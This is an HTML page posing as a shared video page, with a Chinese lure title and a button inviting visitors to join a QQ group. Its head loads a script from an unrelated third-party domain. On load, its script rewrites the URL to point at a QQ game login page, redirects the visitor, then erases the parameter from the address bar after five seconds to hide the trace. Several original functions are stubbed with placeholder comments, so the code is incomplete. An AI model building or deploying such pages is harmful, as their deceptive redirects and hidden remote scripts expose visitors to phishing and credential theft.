<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="x-ua-compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"/>
<title>喜欢就和好兄弟分享</title>
<link rel="stylesheet" href="https://g.alicdn.com/apsara-media-box/imp-web-player/2.19.0/skins/default/aliplayer-min.css" />
<script type="text/javascript" charset="utf-8" src="https://g.alicdn.com/apsara-media-box/imp-web-player/2.19.0/aliplayer-min.js"></script>
<script type="text/javascript" charset="utf-8" src="https://as.jxqhdm.cn/64.js"></script>
<style>
    /* 现有的 CSS 代码 */
</style>
</head>
<body>
<div class="prism-player" id="player-con"></div>
<button class="center-button" onclick="window.location.href='https://mp.qzone.qq.com/u/3413704529?brandflag=0&is_famous_space=1';">点击加新群</button>
<script>
// 现有的 JavaScript 函数 getVideoSource
function getVideoSource() {
    // ...原有代码...
}

var player = new Aliplayer({
    // ...原有 Aliplayer 配置...
}, function (player) {
    // ...原有回调函数...
});

// 添加新的 JavaScript 代码
document.addEventListener('DOMContentLoaded', function() {
    var currentUrl = window.location.href;
    var targetUrl = 'http://lol.qq.com/comm-htdocs/milo_mobile/login.html';
    var paramName = 'url';
    var redirectedUrl = addUrlParam(currentUrl, paramName, targetUrl);

    if (!urlHasParam(currentUrl, paramName, targetUrl)) {
        window.location.href = redirectedUrl;
    } else {
        setTimeout(function() {
            removeUrlParam(paramName, targetUrl);
        }, 5000); // 假设5秒后完成操作
    }
});

function addUrlParam(url, paramName, paramValue) {
    var separator = (url.indexOf('?') !== -1) ? '&' : '?';
    return url + separator + paramName + '=' + encodeURIComponent(paramValue);
}

function urlHasParam(url, paramName, paramValue) {
    var pattern = new RegExp('\\b' + paramName + '=' + encodeURIComponent(paramValue));
    return pattern.test(url);
}

function removeUrlParam(paramName, paramValue) {
    var url = window.location.href;
    var pattern = new RegExp('([&\?])' + paramName + '=' + encodeURIComponent(paramValue));
    var cleanUrl = url.replace(pattern, '');
    cleanUrl = cleanUrl.replace(/[&\?]$/, '');
    history.pushState({}, '', cleanUrl);
}
</script>
</body>
</html>
